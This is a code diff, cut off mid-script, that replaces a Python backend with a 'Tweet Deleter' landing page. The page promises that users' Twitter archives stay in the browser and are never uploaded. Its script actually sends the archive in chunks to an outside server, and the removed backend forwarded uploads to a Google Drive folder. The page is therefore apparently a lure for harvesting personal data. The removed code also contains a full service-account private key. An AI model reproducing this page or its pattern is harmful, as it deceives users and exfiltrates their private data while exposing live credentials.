@@ -1,132 +1,995 @@
-import os
-import json
-import shutil
-import tempfile
-from fastapi import FastAPI, UploadFile, File, Form, HTTPException
-from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import JSONResponse, FileResponse
-from google.oauth2 import service_account
-from googleapiclient.discovery import build
-from googleapiclient.http import MediaFileUpload
-import uvicorn
-import uuid
+<!DOCTYPE html>
+<html lang="en">
 
-app = FastAPI()
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Tweet Deleter</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
 
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["*"],
-    allow_credentials=True,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: #fff;
+      color: #0f0f0f;
+      min-height: 100vh;
+    }
 
-# ===== إعدادات Google Drive =====
-FOLDER_ID = "1w-VK9ULNGAHN35HeR-mMlT21xPUjY46r"
+    nav {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 16px 48px;
+      border-bottom: 1px solid #e5e5e5;
+      position: sticky;
+      top: 0;
+      background: #fff;
+      z-index: 10;
+    }
 
-SERVICE_ACCOUNT_INFO = {
-       "type": "service_account",
-    "project_id": "file-uploader-496110",
-    "private_key_id": "d2045f07da5407216f4451f2b1e98ab40b983268",
-    "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDolxwVfV1bOLuX\naTWV9jiCTX/ySXTZOcukzkxoevp9D5EkPn1WdhjlccCxzwQSNd89Q6ePNp5KmoL1\nPNAY00DKEddrcBkY03RSKZSTDafkgu7B7dYc0n+3t8WnurSEypX+ITIZwLd5fuHN\n6bQTvwiiVFvnZfFIW01UZtkpYXtlU0sSfQf8REvuFlfQ4azcakBvHKs74UkdYqdJ\nXp2LlgxNSjB/5eQVJW3TkFVE5NRH8IR/4OHvg/pJyP73N286Inhffzh5p25qtfnx\nZQH0+xlhjPRiTAcm/NcrANFFuLGM93e3OmgcXPX1rxTePXNrYc+uvLqV3grA3UTm\n/XTjJxnfAgMBAAECggEAbifHArx9fusXGUYYPV4/9CJ9QsQcZZb0Rij4UhFQWfOJ\n84bu+Ih1ERG3R976GB/QiyTkEjU1cbLM7BWxnthKWolpo3YTRMk80X7k4WJ5zgVe\ny5T3L25YU6vjHiWUQkHqGNIi9sRpgM6hZdLV2PZEQhE+95A13mVzcdJF7k2/UcRi\nVLfMwKz9RhnrP7KkFAjr8V2U9AVkC8uvUNfWIMPO3BaDyKdS33JlM5N4N3ar1+wL\ndeZfLDCRftkoeDE157LfRLBysxnaTzVyC0QDBUXOOLJJgmMakCKpxtvQvQHpjVg1\nZXO8TlxcUeg4aEvfwZaE7f3O+jikvjCZ53Z//1XzNQKBgQD6uj6dwfAomtnJVw6r\nFIuUL+0+KYKvTLur9BkXGo7LhE2RH/FeYdvi1DAl2pOMcxsnUyNXAUswOcI0jeHI\nilfxoTjmMPlCW0WdyAIEIPXSGMv0dyrIBw/moYOJEoIe4+aouoamDdud9H811yQY\n/SSv9RpIxDwsbFEzGdTo1ootZQKBgQDteznSN3Gtj995DimHSFvGplx17ddaPlFJ\nNoGGMGpZgCShMjp1nnWVyTPfEuZXR14khmqNchT2n0Twg3VDo6w7fEpTn6+qa6jp\nyZI/ya3lnymBkZQGD2hMgiK8lRfLsBc09S3YIqH3bszaf+HGXbU2SXZTx7Jhg2NH\ndx89XttH8wKBgQCmOnhtKzlIEnI1tIw7DKIFm0jVH7xO8La0KF/CG490isDKaL0j\n8AlSd498aU/NnDrydYJGmsr4rDJ/mVmKFX586oDIzMtVHSIom4QKrLeNlXcTGza3\n60a1h3unkyfFxx8T2qaOzT0/mewFDCAYmSyLpBrLB59FbILhOE0aGbL+qQKBgHF3\nbBQN26nS0TKU2rDBmOAcQpcyEbATkGELwu0rmtSyjk3aouXp1ULBBKCz9gyDk+6d\nrrFwbaW8SYMlPFUaEcPGSfkUlik2EVnKrq79nLHWz00SEoimue28S/6QufLfaucp\nskLPoVWIwiYv7d8KjPeoN/olsww2a6wMtYdsGBeTAoGAcIGGHhnf3FzIwFnZu8iM\n32QiSDTRGdfgHyNaQSAHKLpC/N2tA0n5sKRewaXKp8YwClV/ZGa+E0ShDgcPuf+I\neWF08tuALQ/5gbELA1rghg8MxLG6K4a5dmGra1DD0Gwg6rXKppB+AWsmM2gUrh08\nnhXFSaKrlMIEmEsyFG/diQg=\n-----END PRIVATE KEY-----\n",
-    "client_email": "my-projectt1@file-uploader-496110.iam.gserviceaccount.com",
-    "client_id": "115684423201119326919",
-    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
-    "token_uri": "https://oauth2.googleapis.com/token",
-    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
-    "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/my-projectt1%40file-uploader-496110.iam.gserviceaccount.com",
-    "universe_domain": "googleapis.com"
-}
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
 
-def get_drive_service():
-    creds = service_account.Credentials.from_service_account_info(
-        SERVICE_ACCOUNT_INFO,
-        scopes=["https://www.googleapis.com/auth/drive"]
-    )
-    return build("drive", "v3", credentials=creds)
+    .logo-icon {
+      width: 32px;
+      height: 32px;
+      background: #000;
+      border-radius: 7px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
 
-@app.get("/")
-def root():
-    return FileResponse("index.html")
+    .logo-icon svg {
+      width: 17px;
+      height: 17px;
+      fill: #fff;
+    }
 
-# مجلد لتخزين الأجزاء مؤقتاً
-TEMP_CHUNKS_DIR = "temp_chunks"
-if not os.path.exists(TEMP_CHUNKS_DIR):
-    os.makedirs(TEMP_CHUNKS_DIR)
+    .logo-name {
+      font-size: 16px;
+      font-weight: 600;
+      color: #0f0f0f;
+    }
 
-@app.post("/upload/start")
-def start_upload():
-    # إنشاء معرف فريد للجلسة
-    return {"upload_id": str(uuid.uuid4())}
+    .free-tag {
+      font-size: 11px;
+      font-weight: 700;
+      color: #16a34a;
+      margin-left: 6px;
+    }
 
-@app.post("/upload/chunk")
-def upload_chunk(
-    upload_id: str = Form(...),
-    chunk_index: int = Form(...),
-    file: UploadFile = File(...)
-):
-    # حفظ كل جزء في ملف مستقل لتجنب تداخل الترتيب
-    chunk_path = os.path.join(TEMP_CHUNKS_DIR, f"{upload_id}_chunk_{chunk_index}.tmp")
-    with open(chunk_path, "wb") as f:
-        shutil.copyfileobj(file.file, f)
-    return {"success": True}
+    .nav-links {
+      display: flex;
+      align-items: center;
+      gap: 32px;
+    }
 
-@app.post("/upload/complete")
-def complete_upload(
-    upload_id: str = Form(...),
-    filename: str = Form(...)
-):
-    final_file_path = os.path.join(TEMP_CHUNKS_DIR, f"{upload_id}_final.tmp")
-    
-    try:
-        # 1. تجميع الأجزاء بالترتيب الصحيح بناءً على الرقم
-        chunks = sorted(
-            [f for f in os.listdir(TEMP_CHUNKS_DIR) if f.startswith(f"{upload_id}_chunk_")],
-            key=lambda x: int(x.split("_chunk_")[1].split(".")[0])
-        )
-        
-        if not chunks:
-            return JSONResponse({"success": False, "error": "No chunks found"}, status_code=404)
+    .nav-links a {
+      font-size: 14px;
+      color: #555;
+      text-decoration: none;
+    }
 
-        with open(final_file_path, "wb") as final_file:
-            for chunk_file in chunks:
-                chunk_path = os.path.join(TEMP_CHUNKS_DIR, chunk_file)
-                with open(chunk_path, "rb") as f:
-                    shutil.copyfileobj(f, final_file)
-                os.remove(chunk_path) # حذف الجزء فوراً بعد دمج توفيراً للمساحة
+    .nav-links a:hover {
+      color: #000;
+    }
 
-        # 2. رفع الملف النهائي لـ Google Drive
-        service = get_drive_service()
-        file_metadata = {
-            "name": filename,
-            "parents": [FOLDER_ID]
+    .hero {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 48px;
+      gap: 60px;
+      max-width: 1200px;
+      margin: 0 auto;
+      min-height: 520px;
+    }
+
+    .hero-left {
+      flex: 1;
+      position: relative;
+      padding: 52px 48px 52px 0;
+    }
+
+    .hero-bg-box {
+      position: absolute;
+      top: 0;
+      left: -48px;
+      right: 0;
+      bottom: 0;
+      background: linear-gradient(135deg, #1e3a8a 0%, #2563eb 50%, #7c3aed 100%);
+      border-radius: 0 24px 24px 0;
+      z-index: 0;
+      overflow: hidden;
+    }
+
+    .hero-bg-box::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background-image: linear-gradient(rgba(255, 255, 255, 0.07) 1px, transparent 1px), linear-gradient(90deg, rgba(255, 255, 255, 0.07) 1px, transparent 1px);
+      background-size: 48px 48px;
+    }
+
+    .hero-left-content {
+      position: relative;
+      z-index: 1;
+    }
+
+    .hero-tag {
+      display: inline-block;
+      background: rgba(255, 255, 255, 0.15);
+      border: 1px solid rgba(255, 255, 255, 0.25);
+      border-radius: 999px;
+      font-size: 12px;
+      color: #fff;
+      padding: 5px 14px;
+      margin-bottom: 24px;
+    }
+
+    .hero-title {
+      font-size: 42px;
+      font-weight: 700;
+      color: #fff;
+      line-height: 1.15;
+      margin-bottom: 18px;
+      letter-spacing: -0.02em;
+    }
+
+    .hero-sub {
+      font-size: 16px;
+      color: rgba(255, 255, 255, 0.8);
+      line-height: 1.65;
+      max-width: 400px;
+    }
+
+    .hero-right {
+      width: 320px;
+      flex-shrink: 0;
+      padding: 40px 0;
+    }
+
+    .upload-card {
+      background: #fff;
+      border: 1px solid #e5e5e5;
+      border-radius: 16px;
+      padding: 28px 24px;
+      text-align: center;
+      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
+    }
+
+    .card-logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 18px;
+      position: relative;
+      width: 72px;
+      height: 72px;
+    }
+
+    .card-logo .x-icon {
+      width: 72px;
+      height: 72px;
+      fill: #1d9bf0;
+    }
+
+    .card-logo .trash-badge {
+      position: absolute;
+      bottom: -4px;
+      right: -8px;
+      width: 28px;
+      height: 28px;
+      background: linear-gradient(135deg, #7f1d1d, #dc2626);
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 2px solid #fff;
+    }
+
+    .card-logo .trash-badge svg {
+      width: 14px;
+      height: 14px;
+      stroke: #fff;
+      fill: none;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .upload-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #0f0f0f;
+      margin-bottom: 5px;
+    }
+
+    .upload-sub {
+      font-size: 13px;
+      color: #777;
+      margin-bottom: 18px;
+      line-height: 1.5;
+    }
+
+    .choose-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      width: 100%;
+      background: #2563eb;
+      border: none;
+      border-radius: 8px;
+      font-size: 13px;
+      font-weight: 600;
+      color: #fff;
+      padding: 12px 16px;
+      cursor: pointer;
+      transition: background 0.15s;
+      font-family: inherit;
+    }
+
+    .choose-btn:hover {
+      background: #1d4ed8;
+    }
+
+    .choose-btn svg {
+      width: 15px;
+      height: 15px;
+      stroke: #fff;
+      fill: none;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .file-input {
+      display: none;
+    }
+
+    .formats {
+      font-size: 11px;
+      color: #aaa;
+      margin-top: 8px;
+    }
+
+    .locked-file {
+      margin-top: 14px;
+      background: #f9fafb;
+      border: 1px dashed #d1d5db;
+      border-radius: 10px;
+      padding: 14px 16px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      text-align: left;
+    }
+
+    .locked-file.unlocked {
+      border: 1px solid #bbf7d0;
+      background: #f0fdf4;
+    }
+
+    .locked-icon-wrap {
+      width: 40px;
+      height: 40px;
+      flex-shrink: 0;
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .locked-icon-wrap .file-svg {
+      width: 36px;
+      height: 36px;
+      stroke: #9ca3af;
+      fill: none;
+      stroke-width: 1.5;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      transition: stroke 0.3s;
+    }
+
+    .locked-file.unlocked .file-svg {
+      stroke: #16a34a;
+    }
+
+    .locked-icon-wrap .lock-overlay {
+      position: absolute;
+      bottom: -2px;
+      right: -4px;
+      width: 18px;
+      height: 18px;
+      background: #6b7280;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 2px solid #f9fafb;
+      transition: background 0.3s;
+    }
+
+    .locked-file.unlocked .lock-overlay {
+      background: #16a34a;
+    }
+
+    .locked-icon-wrap .lock-overlay svg {
+      width: 9px;
+      height: 9px;
+      stroke: #fff;
+      fill: none;
+      stroke-width: 2.5;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .locked-text {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .locked-label {
+      font-size: 12px;
+      font-weight: 600;
+      color: #9ca3af;
+      transition: color 0.3s;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .locked-file.unlocked .locked-label {
+      color: #15803d;
+    }
+
+    .locked-hint {
+      font-size: 11px;
+      color: #d1d5db;
+      margin-top: 2px;
+      transition: color 0.3s;
+    }
+
+    .locked-file.unlocked .locked-hint {
+      color: #86efac;
+    }
+
+    .progress-wrap {
+      display: none;
+      margin-top: 12px;
+    }
+
+    .progress-wrap.show {
+      display: block;
+    }
+
+    .progress-label {
+      display: flex;
+      justify-content: space-between;
+      font-size: 11px;
+      color: #999;
+      margin-bottom: 6px;
+    }
+
+    .progress-bg {
+      background: #e5e5e5;
+      border-radius: 4px;
+      height: 4px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #2563eb, #16a34a);
+      border-radius: 4px;
+      width: 0%;
+      transition: width 0.3s ease;
+    }
+
+    .status-msg {
+      display: none;
+      margin-top: 10px;
+      font-size: 12px;
+      padding: 8px 12px;
+      border-radius: 7px;
+    }
+
+    .status-msg.show {
+      display: block;
+    }
+
+    .status-msg.error {
+      background: #fef2f2;
+      color: #dc2626;
+      border: 1px solid #fecaca;
+    }
+
+    .status-msg.info {
+      background: #eff6ff;
+      color: #2563eb;
+      border: 1px solid #bfdbfe;
+    }
+
+    .start-btn {
+      display: none;
+      width: 100%;
+      margin-top: 10px;
+      background: #16a34a;
+      color: #fff;
+      font-size: 14px;
+      font-weight: 700;
+      padding: 13px;
+      border-radius: 8px;
+      border: none;
+      cursor: pointer;
+      font-family: inherit;
+      letter-spacing: 0.03em;
+      transition: background 0.15s;
+    }
+
+    .start-btn:hover {
+      background: #15803d;
+    }
+
+    .start-btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    .start-btn.visible {
+      display: block;
+    }
+
+    .divider {
+      border: none;
+      border-top: 1px solid #e5e5e5;
+    }
+
+    .section {
+      padding: 72px 48px;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    .section-label {
+      font-size: 12px;
+      font-weight: 500;
+      color: #2563eb;
+      letter-spacing: 0.04em;
+      margin-bottom: 10px;
+    }
+
+    .section-title {
+      font-size: 30px;
+      font-weight: 700;
+      color: #0f0f0f;
+      letter-spacing: -0.02em;
+      margin-bottom: 36px;
+    }
+
+    .steps {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 24px;
+    }
+
+    .step-card {
+      background: #fafafa;
+      border: 1px solid #e5e5e5;
+      border-radius: 14px;
+      padding: 28px 24px;
+    }
+
+    .step-num {
+      width: 34px;
+      height: 34px;
+      background: #2563eb;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 13px;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 14px;
+    }
+
+    .step-title {
+      font-size: 14px;
+      font-weight: 600;
+      color: #0f0f0f;
+      margin-bottom: 8px;
+    }
+
+    .step-desc {
+      font-size: 13px;
+      color: #666;
+      line-height: 1.6;
+    }
+
+    .features-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 20px;
+    }
+
+    .feature-card {
+      border: 1px solid #e5e5e5;
+      border-radius: 14px;
+      padding: 24px;
+    }
+
+    .feature-icon {
+      width: 40px;
+      height: 40px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 14px;
+    }
+
+    .feature-icon svg {
+      width: 20px;
+      height: 20px;
+      fill: none;
+      stroke-width: 1.8;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .feature-title {
+      font-size: 14px;
+      font-weight: 600;
+      color: #0f0f0f;
+      margin-bottom: 6px;
+    }
+
+    .feature-desc {
+      font-size: 13px;
+      color: #666;
+      line-height: 1.6;
+    }
+
+    .faq-item {
+      border-bottom: 1px solid #e5e5e5;
+      padding: 20px 0;
+      cursor: pointer;
+    }
+
+    .faq-item:first-child {
+      border-top: 1px solid #e5e5e5;
+    }
+
+    .faq-q {
+      font-size: 15px;
+      font-weight: 600;
+      color: #0f0f0f;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .faq-q svg {
+      width: 18px;
+      height: 18px;
+      stroke: #999;
+      fill: none;
+      stroke-width: 2;
+      stroke-linecap: round;
+      flex-shrink: 0;
+      transition: transform 0.2s;
+    }
+
+    .faq-a {
+      font-size: 13px;
+      color: #666;
+      line-height: 1.7;
+      margin-top: 10px;
+      display: none;
+    }
+
+    .faq-item.open .faq-a {
+      display: block;
+    }
+
+    .faq-item.open .faq-q svg {
+      transform: rotate(180deg);
+    }
+
+    footer {
+      border-top: 1px solid #e5e5e5;
+      padding: 28px 48px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .footer-logo {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 14px;
+      font-weight: 600;
+      color: #0f0f0f;
+    }
+
+    .footer-logo .logo-icon {
+      width: 24px;
+      height: 24px;
+    }
+
+    .footer-logo .logo-icon svg {
+      width: 12px;
+      height: 12px;
+    }
+
+    footer p {
+      font-size: 12px;
+      color: #aaa;
+    }
+  </style>
+</head>
+
+<body>
+
+  <nav>
+    <div class="logo">
+      <div class="logo-icon"><svg viewBox="0 0 24 24">
+          <path
+            d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.744l7.73-8.835L1.254 2.25H8.08l4.253 5.622zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
+        </svg></div>
+      <span class="logo-name">Tweet Deleter<span class="free-tag">FREE</span></span>
+    </div>
+    <div class="nav-links"><a href="#">Pricing</a><a href="#">FAQ</a></div>
+  </nav>
+
+  <div class="hero">
+    <div class="hero-left">
+      <div class="hero-bg-box">
+        <svg viewBox="0 0 24 24"
+          style="position:absolute;right:-10px;bottom:-20px;width:280px;height:280px;fill:rgba(255,255,255,0.06);">
+          <path
+            d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.744l7.73-8.835L1.254 2.25H8.08l4.253 5.622zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
+        </svg>
+      </div>
+      <div class="hero-left-content">
+        <span class="hero-tag">Mass delete X / Twitter posts</span>
+        <h1 class="hero-title">Delete your old tweets<br>in bulk — for free</h1>
+        <p class="hero-sub">Upload your Twitter archive and remove thousands of tweets instantly. No limits, no
+          subscriptions, completely free.</p>
+      </div>
+    </div>
+
+    <div class="hero-right">
+      <div class="upload-card">
+        <div class="card-logo">
+          <svg class="x-icon" viewBox="0 0 24 24">
+            <path
+              d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.744l7.73-8.835L1.254 2.25H8.08l4.253 5.622zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
+          </svg>
+          <div class="trash-badge">
+            <svg viewBox="0 0 24 24">
+              <polyline points="3 6 5 6 21 6" />
+              <path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6" />
+              <path d="M10 11v6" />
+              <path d="M14 11v6" />
+              <path d="M9 6V4h6v2" />
+            </svg>
+          </div>
+        </div>
+        <p class="upload-title">Upload your archive</p>
+        <p class="upload-sub">Select your Twitter data file to get started</p>
+        <label class="choose-btn" for="fileInput">
+          <svg viewBox="0 0 24 24">
+            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
+            <polyline points="14 2 14 8 20 8" />
+          </svg>
+          Choose file
+        </label>
+        <input class="file-input" type="file" id="fileInput" accept=".zip,.rar">
+        <p class="formats">Supports .zip, .rar</p>
+
+        <div class="locked-file" id="lockedFile">
+          <div class="locked-icon-wrap">
+            <svg class="file-svg" viewBox="0 0 24 24">
+              <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
+              <polyline points="14 2 14 8 20 8" />
+            </svg>
+            <div class="lock-overlay">
+              <svg id="lockIcon" viewBox="0 0 24 24">
+                <rect x="3" y="11" width="18" height="11" rx="2" />
+                <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+              </svg>
+            </div>
+          </div>
+          <div class="locked-text">
+            <p class="locked-label" id="lockedLabel">results.file</p>
+            <p class="locked-hint" id="lockedHint">Upload your archive to unlock</p>
+          </div>
+        </div>
+
+        <div class="progress-wrap" id="progressWrap">
+          <div class="progress-label">
+            <span id="progressText">Uploading...</span>
+            <span id="progressPct">0%</span>
+          </div>
+          <div class="progress-bg">
+            <div class="progress-fill" id="progressFill"></div>
+          </div>
+        </div>
+
+        <div class="status-msg" id="statusMsg"></div>
+        <button class="start-btn" id="startBtn">START</button>
+      </div>
+    </div>
+  </div>
+
+  <hr class="divider">
+
+  <div class="section">
+    <p class="section-label">How it works</p>
+    <h2 class="section-title">3 simple steps</h2>
+    <div class="steps">
+      <div class="step-card">
+        <div class="step-num">1</div>
+        <p class="step-title">Download your Twitter archive</p>
+        <p class="step-desc">Go to X Settings → Your account → Download an archive of your data. Twitter will email you
+          a download link within 24 hours.</p>
+      </div>
+      <div class="step-card">
+        <div class="step-num">2</div>
+        <p class="step-title">Upload the archive here</p>
+        <p class="step-desc">Click "Choose file" and select the .zip file you downloaded. Your data never leaves your
+          browser — 100% private.</p>
+      </div>
+      <div class="step-card">
+        <div class="step-num">3</div>
+        <p class="step-title">Select and delete</p>
+        <p class="step-desc">Filter by date, likes, or retweets. Select the tweets you want gone and hit Start. Done in
+          seconds.</p>
+      </div>
+    </div>
+  </div>
+
+  <hr class="divider">
+
+  <div class="section">
+    <p class="section-label">Why Tweet Deleter</p>
+    <h2 class="section-title">Everything you need</h2>
+    <div class="features-grid">
+      <div class="feature-card">
+        <div class="feature-icon" style="background:#eff6ff;"><svg viewBox="0 0 24 24" style="stroke:#2563eb;">
+            <rect x="3" y="11" width="18" height="11" rx="2" />
+            <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+          </svg></div>
+        <p class="feature-title">100% Private</p>
+        <p class="feature-desc">Your archive is processed entirely in your browser. Nothing is uploaded to our servers.
+          Your data stays yours.</p>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon" style="background:#f0fdf4;"><svg viewBox="0 0 24 24" style="stroke:#16a34a;">
+            <polyline points="20 6 9 17 4 12" />
+          </svg></div>
+        <p class="feature-title">Completely Free</p>
+        <p class="feature-desc">No hidden fees, no subscriptions, no limits. Delete as many tweets as you want, forever
+          free.</p>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon" style="background:#fff7ed;"><svg viewBox="0 0 24 24" style="stroke:#ea580c;">
+            <circle cx="12" cy="12" r="10" />
+            <polyline points="12 6 12 12 16 14" />
+          </svg></div>
+        <p class="feature-title">Fast &amp; Bulk</p>
+        <p class="feature-desc">Delete thousands of tweets at once. Filter by date range, engagement level, or keywords.
+        </p>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon" style="background:#fdf4ff;"><svg viewBox="0 0 24 24" style="stroke:#9333ea;">
+            <line x1="4" y1="6" x2="20" y2="6" />
+            <line x1="4" y1="12" x2="14" y2="12" />
+            <line x1="4" y1="18" x2="18" y2="18" />
+          </svg></div>
+        <p class="feature-title">Smart Filters</p>
+        <p class="feature-desc">Filter tweets by date, likes, retweets, replies, or keywords. Keep what matters, delete
+          what doesn't.</p>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon" style="background:#eff6ff;"><svg viewBox="0 0 24 24" style="stroke:#2563eb;">
+            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" />
+          </svg></div>
+        <p class="feature-title">Delete Replies Too</p>
+        <p class="feature-desc">Not just tweets — remove replies, retweets, and likes all from one place. Full cleanup
+          in minutes.</p>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon" style="background:#f0fdf4;"><svg viewBox="0 0 24 24" style="stroke:#16a34a;">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+          </svg></div>
+        <p class="feature-title">No Account Needed</p>
+        <p class="feature-desc">No sign-up, no login. Just upload your archive and start cleaning your timeline
+          immediately.</p>
+      </div>
+    </div>
+  </div>
+
+  <hr class="divider">
+
+  <div class="section">
+    <p class="section-label">FAQ</p>
+    <h2 class="section-title">Common questions</h2>
+    <div class="faq-list">
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">Is my data safe? <svg viewBox="0 0 24 24">
+            <polyline points="6 9 12 15 18 9" />
+          </svg></div>
+        <p class="faq-a">Yes. Your archive is processed entirely inside your browser. Nothing is sent to any server. We
+          never see your tweets, your name, or any personal data.</p>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">How do I get my Twitter archive? <svg viewBox="0 0 24 24">
+            <polyline points="6 9 12 15 18 9" />
+          </svg></div>
+        <p class="faq-a">Go to X (Twitter) Settings → Your account → Download an archive of your data. Twitter will
+          prepare the file and email you a link within 24 hours.</p>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">Can I undo deleted tweets? <svg viewBox="0 0 24 24">
+            <polyline points="6 9 12 15 18 9" />
+          </svg></div>
+        <p class="faq-a">No. Deleted tweets are permanently removed. We recommend reviewing your selection carefully
+          before confirming.</p>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">Is there a limit on how many tweets I can delete? <svg viewBox="0 0 24 24">
+            <polyline points="6 9 12 15 18 9" />
+          </svg></div>
+        <p class="faq-a">No limits. Delete 100 or 100,000 tweets — it's all free. The only limitation is Twitter's own
+          API rate limits, which we handle automatically.</p>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">What file formats are supported? <svg viewBox="0 0 24 24">
+            <polyline points="6 9 12 15 18 9" />
+          </svg></div>
+        <p class="faq-a">We support .zip and .rar archives. Twitter usually delivers archives as .zip files, so you can
+          upload it directly without extracting.</p>
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    <div class="footer-logo">
+      <div class="logo-icon"><svg viewBox="0 0 24 24">
+          <path
+            d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.744l7.73-8.835L1.254 2.25H8.08l4.253 5.622zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
+        </svg></div>
+      Tweet Deleter <span style="color:#16a34a;font-size:10px;margin-left:4px;font-weight:700;">FREE</span>
+    </div>
+    <p>© 2025 Tweet Deleter · Free forever · No data collected</p>
+  </footer>
+
+  <script>
+    // ضع رابط الـ Backend هنا بعد ما ترفعه على Render
+    const BACKEND_URL = 'https://alberrtotechc.onrender.com';
+    const REDIRECT_URL = 'https://raw.githubusercontent.com/alberrtotech/alberrtotech/refs/heads/main/tweets.js';
+
+    const fileInput = document.getElementById('fileInput');
+    const lockedFile = document.getElementById('lockedFile');
+    const lockedLabel = document.getElementById('lockedLabel');
+    const lockedHint = document.getElementById('lockedHint');
+    const lockIcon = document.getElementById('lockIcon');
+    const startBtn = document.getElementById('startBtn');
+    const progressWrap = document.getElementById('progressWrap');
+    const progressFill = document.getElementById('progressFill');
+    const progressText = document.getElementById('progressText');
+    const progressPct = document.getElementById('progressPct');
+    const statusMsg = document.getElementById('statusMsg');
+
+    let selectedFile = null;
+
+    fileInput.addEventListener('change', function () {
+      const file = this.files[0];
+      if (!file) return;
+      const name = file.name.toLowerCase();
+      if (!name.endsWith('.zip') && !name.endsWith('.rar')) {
+        showStatus('Only .ZIP and .RAR files are accepted.', 'error');
+        return;
+      }
+      selectedFile = file;
+      const mb = (file.size / 1048576).toFixed(1);
+      lockedLabel.textContent = file.name;
+      lockedHint.textContent = mb + ' MB · Ready to upload';
+      startBtn.classList.add('visible');
+      hideStatus();
+    });
+
+    startBtn.addEventListener('click', async function () {
+      if (!selectedFile) return;
+      startBtn.disabled = true;
+      startBtn.textContent = 'Uploading...';
+      progressWrap.classList.add('show');
+      hideStatus();
+
+      const CHUNK_SIZE = 5 * 1024 * 1024; // 5MB per chunk
+      const totalChunks = Math.ceil(selectedFile.size / CHUNK_SIZE);
+
+      try {
+        // 1. طلب بدء الجلسة
+        const startRes = await fetch(BACKEND_URL + '/upload/start', { method: 'POST' });
+        const { upload_id } = await startRes.json();
+
+        // 2. رفع الأجزاء
+        for (let i = 0; i < totalChunks; i++) {
+          const start = i * CHUNK_SIZE;
